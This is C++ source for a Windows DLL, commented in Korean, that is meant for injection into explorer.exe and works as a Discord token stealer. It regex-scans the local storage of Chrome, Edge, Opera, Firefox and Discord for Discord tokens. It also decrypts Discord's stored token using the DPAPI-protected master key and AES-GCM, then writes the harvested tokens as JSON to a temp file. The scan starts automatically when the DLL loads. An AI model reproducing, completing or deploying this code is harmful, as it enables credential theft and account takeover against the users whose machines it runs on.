// dllmain.cpp (최종 완성본)
// 이 DLL은 explorer.exe에 주입되어, 해당 사용자의 권한으로 데이터 스캔을 수행합니다.

#include "pch.h"
#define NOMINMAX
#include <windows.h>
#include "json.hpp" // nlohmann/json 라이브러리가 프로젝트에 포함되어 있어야 합니다.
#include <string>
#include <vector>
#include <map>
#include <set>
#include <fstream>
#include <sstream>
#include <utility>
#include <algorithm>
#include <iostream>
#include <filesystem>
#include <shlobj.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <regex>
#include <thread>

#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "User32.lib")

// --- 타입 정의 ---
using byte = unsigned char;
using json = nlohmann::json;

// --- 헬퍼 함수 및 전역 변수 ---
static const std::vector<std::pair<std::wstring, std::wstring>> g_pathPatterns = {
    {L"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\", L"크롬"},
    {L"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\", L"엣지"},
    {L"%APPDATA%\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\", L"오페라"},
    {L"%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default-release\\storage\\default\\", L"파이어폭스"},
    {L"%APPDATA%\\discord\\Local Storage\\leveldb\\", L"디스코드 (일반)"},
};

// --- 문자열 변환 및 경로 처리 함수들 ---
static std::string WToUtf8(const std::wstring& s) {
    if (s.empty()) return "";
    int n = WideCharToMultiByte(CP_UTF8, 0, s.data(), (int)s.size(), nullptr, 0, nullptr, nullptr);
    if (n <= 0) return "";
    std::string u(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, s.data(), (int)s.size(), &u[0], n, nullptr, nullptr);
    return u;
}

static std::wstring Utf8ToWide(const std::string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), nullptr, 0);
    if (n <= 0) return L"";
    std::wstring w(n, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), &w[0], n);
    return w;
}

static std::wstring ExpandEnv(const std::wstring& in) {
    DWORD need = ExpandEnvironmentStringsW(in.c_str(), nullptr, 0);
    if (!need) return in;
    std::wstring out(need, L'\0');
    ExpandEnvironmentStringsW(in.c_str(), &out[0], need);
    if (!out.empty() && out.back() == L'\0') out.pop_back();
    return out;
}

static bool IsDirectory(const std::wstring& path) {
    DWORD attr = GetFileAttributesW(path.c_str());
    return (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY));
}

static void EnumFilesRecursive(const std::wstring& dir, std::vector<std::wstring>& outFiles) {
    try {
        if (std::filesystem::exists(dir) && std::filesystem::is_directory(dir)) {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(dir, std::filesystem::directory_options::skip_permission_denied)) {
                if (entry.is_regular_file()) {
                    outFiles.push_back(entry.path().wstring());
                }
            }
        }
    }
    catch (...) {}
}

static std::vector<std::wstring> GlobResolve(const std::wstring& pattern) {
    std::vector<std::wstring> resolved_paths;
    size_t wildcard_pos = pattern.find_first_of(L"*?");
    if (wildcard_pos == std::wstring::npos) {
        if (GetFileAttributesW(pattern.c_str()) != INVALID_FILE_ATTRIBUTES) {
            resolved_paths.push_back(pattern);
        }
        return resolved_paths;
    }
    size_t last_slash = pattern.rfind(L'\\', wildcard_pos);
    std::wstring dir_path = (last_slash == std::wstring::npos) ? L"." : pattern.substr(0, last_slash);
    WIN32_FIND_DATAW find_data;
    HANDLE h_find = FindFirstFileW(pattern.c_str(), &find_data);
    if (h_find != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(find_data.cFileName, L".") != 0 && wcscmp(find_data.cFileName, L"..") != 0) {
                resolved_paths.push_back(dir_path + L"\\" + find_data.cFileName);
            }
        } while (FindNextFileW(h_find, &find_data) != 0);
        FindClose(h_find);
    }
    return resolved_paths;
}

// --- 파일 스캔 함수 ---
static bool ReadAndScanFile(const std::wstring& file, std::set<std::wstring>& outTokens) {
    HANDLE hFile = CreateFileW(file.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER file_size;
    if (!GetFileSizeEx(hFile, &file_size) || file_size.QuadPart == 0) {
        CloseHandle(hFile);
        return false;
    }
    DWORD bytes_to_read = (DWORD)min((ULONGLONG)file_size.QuadPart, 2 * 1024 * 1024);
    std::string buffer(bytes_to_read, '\0');
    DWORD bytes_read;
    if (ReadFile(hFile, &buffer[0], bytes_to_read, &bytes_read, NULL) && bytes_read > 0) {
        buffer.resize(bytes_read);
        static const std::regex re(R"re((?:[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9\-_]{27}|mfa\.[a-zA-Z0-9\-_]{84}))re");
        try {
            for (std::sregex_iterator it(buffer.begin(), buffer.end(), re), end_it; it != end_it; ++it) {
                outTokens.insert(Utf8ToWide(it->str()));
            }
        }
        catch (...) {}
    }
    CloseHandle(hFile);
    return true;
}

// --- 디스코드 정밀 복호화 로직 ---
namespace DiscordDecryptor {
    std::vector<byte> Base64Decode(const std::string& base64_string) {
        DWORD decoded_size = 0;
        CryptStringToBinaryA(base64_string.c_str(), 0, CRYPT_STRING_BASE64, NULL, &decoded_size, NULL, NULL);
        if (decoded_size == 0) return {};
        std::vector<byte> decoded_data(decoded_size);
        CryptStringToBinaryA(base64_string.c_str(), 0, CRYPT_STRING_BASE64, decoded_data.data(), &decoded_size, NULL, NULL);
        return decoded_data;
    }

    std::wstring GetAppDataPath() {
        PWSTR path = NULL;
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &path))) {
            std::wstring appDataPath(path);
            CoTaskMemFree(path);
            return appDataPath;
        }
        return L"";
    }

    std::vector<byte> GetMasterKey(const std::wstring& localStatePath) {
        std::ifstream ifs(localStatePath);
        if (!ifs.is_open()) return {};
        try {
            json state;
            ifs >> state;
            std::string encryptedKeyB64 = state["os_crypt"]["encrypted_key"];
            std::vector<byte> encryptedKeyWithPrefix = Base64Decode(encryptedKeyB64);
            if (encryptedKeyWithPrefix.size() <= 5) return {};
            std::vector<byte> encryptedKey(encryptedKeyWithPrefix.begin() + 5, encryptedKeyWithPrefix.end());
            DATA_BLOB inputBlob{}, outputBlob{};
            inputBlob.pbData = encryptedKey.data();
            inputBlob.cbData = static_cast<DWORD>(encryptedKey.size());
            if (CryptUnprotectData(&inputBlob, NULL, NULL, NULL, NULL, 0, &outputBlob)) {
                std::vector<byte> masterKey(outputBlob.pbData, outputBlob.pbData + outputBlob.cbData);
                LocalFree(outputBlob.pbData);
                return masterKey;
            }
        }
        catch (...) {}
        return {};
    }

    std::vector<byte> FindEncryptedToken(const std::wstring& levelDbPath) {
        const std::string tokenKey = "token";
        const std::string discordHost = "discord.com";
        try {
            if (!std::filesystem::exists(levelDbPath) || !std::filesystem::is_directory(levelDbPath)) return {};
            for (const auto& entry : std::filesystem::directory_iterator(levelDbPath)) {
                if (entry.is_regular_file() && (entry.path().extension() == ".ldb" || entry.path().extension() == ".log")) {
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (!file) continue;
                    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    auto host_it = std::search(buffer.begin(), buffer.end(), discordHost.begin(), discordHost.end());
                    if (host_it == buffer.end()) continue;
                    auto key_it = std::search(host_it, buffer.end(), tokenKey.begin(), tokenKey.end());
                    if (key_it != buffer.end()) {
                        size_t pos = std::distance(buffer.begin(), key_it) + tokenKey.length();
                        if (pos + 5 < buffer.size() && buffer[pos + 3] == 'v' && (buffer[pos + 4] == '1' || buffer[pos + 4] == '0')) {
                            size_t value_len = buffer[pos + 2];
                            if (pos + 3 + value_len < buffer.size()) {
                                return std::vector<byte>((byte*)buffer.data() + pos + 3, (byte*)buffer.data() + pos + 3 + value_len);
                            }
                        }
                    }
                }
            }
        }
        catch (...) {}
        return {};
    }

    std::string DecryptToken(const std::vector<byte>& masterKey, const std::vector<byte>& encryptedPayload) {
        if (masterKey.empty() || encryptedPayload.size() < 27) return "Error: Invalid key or payload.";
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        std::string decryptedToken = u8"Error: 복호화 실패";
        if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return "Error: BCryptOpenAlgorithmProvider";
        if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) { BCryptCloseAlgorithmProvider(hAlg, 0); return "Error: BCryptSetProperty"; }
        if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)masterKey.data(), (ULONG)masterKey.size(), 0))) { BCryptCloseAlgorithmProvider(hAlg, 0); return "Error: BCryptGenerateSymmetricKey"; }
        std::vector<byte> nonce(encryptedPayload.begin() + 3, encryptedPayload.begin() + 15);
        std::vector<byte> ciphertext(encryptedPayload.begin() + 15, encryptedPayload.end());
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        RtlZeroMemory(&authInfo, sizeof(authInfo));
        authInfo.cbSize = sizeof(authInfo);
        authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
        authInfo.pbNonce = nonce.data();
        authInfo.cbNonce = (ULONG)nonce.size();
        authInfo.pbTag = ciphertext.data() + (ciphertext.size() - 16);
        authInfo.cbTag = 16;
        ULONG decrypted_len = 0;
        std::vector<byte> decrypted_data(ciphertext.size() - 16);
        if (BCRYPT_SUCCESS(BCryptDecrypt(hKey, ciphertext.data(), (ULONG)ciphertext.size() - 16, &authInfo, NULL, 0, decrypted_data.data(), (ULONG)decrypted_data.size(), &decrypted_len, 0))) {
            decryptedToken.assign((char*)decrypted_data.data(), decrypted_len);
        }
        if (hKey) BCryptDestroyKey(hKey);
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
        return decryptedToken;
    }

    std::string GetDecryptedDiscordToken() {
        std::wstring appDataPath = GetAppDataPath();
        if (appDataPath.empty()) return u8"❌ 실패: APPDATA 경로를 찾을 수 없습니다.";
        std::wstring discordPath = appDataPath + L"\\discord";
        std::vector<byte> masterKey = GetMasterKey(discordPath + L"\\Local State");
        if (masterKey.empty()) return u8"❌ 실패: 마스터 키를 획득할 수 없습니다.";
        std::vector<byte> encryptedToken = FindEncryptedToken(discordPath + L"\\Local Storage\\leveldb");
        if (encryptedToken.empty()) return u8"❌ 실패: 암호화된 토큰을 찾을 수 없습니다.";
        return DecryptToken(masterKey, encryptedToken);
    }
}

// --- 이 DLL이 수행할 메인 스캔 함수 ---
void ExecuteScan() {
    std::map<std::wstring, std::set<std::wstring>> byTag;

    // 1. 일반 스캔 (g_pathPatterns 기반)
    for (const auto& pt : g_pathPatterns) {
        const std::wstring& pattern = pt.first;
        const std::wstring& tag = pt.second;
        auto resolved = GlobResolve(ExpandEnv(pattern));
        for (const auto& p : resolved) {
            if (IsDirectory(p)) {
                std::vector<std::wstring> files;
                EnumFilesRecursive(p, files);
                for (const auto& f : files) {
                    ReadAndScanFile(f, byTag[tag]);
                }
            }
            else {
                ReadAndScanFile(p, byTag[tag]);
            }
        }
    }

    // 2. 디스코드 정밀 스캔
    std::string discordTokenResult = DiscordDecryptor::GetDecryptedDiscordToken();
    if (!discordTokenResult.empty()) {
        byTag[L"디스코드 (정밀)"].insert(Utf8ToWide(discordTokenResult));
    }

    // 3. 결과를 JSON 형태로 임시 파일에 저장
    json j;
    for (const auto& pair : byTag) {
        if (!pair.second.empty()) {
            std::vector<std::string> tokens;
            for (const auto& token : pair.second) {
                tokens.push_back(WToUtf8(token));
            }
            j[WToUtf8(pair.first)] = tokens;
        }
    }

    if (!j.empty()) {
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        std::wstring resultFile = std::wstring(tempPath) + L"result.tmp";

        std::ofstream outFile(resultFile);
        outFile << j.dump(4);
        outFile.close();
    }
}


// --- DLL의 진입점 ---
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // DllMain에서 오래 걸리는 작업을 하면 데드락이 발생할 수 있으므로 새 스레드를 생성합니다.
        // 스레드 핸들을 바로 닫아주면 스레드 종료 시 자원이 자동으로 정리됩니다.
        CloseHandle(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecuteScan, NULL, 0, NULL));
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}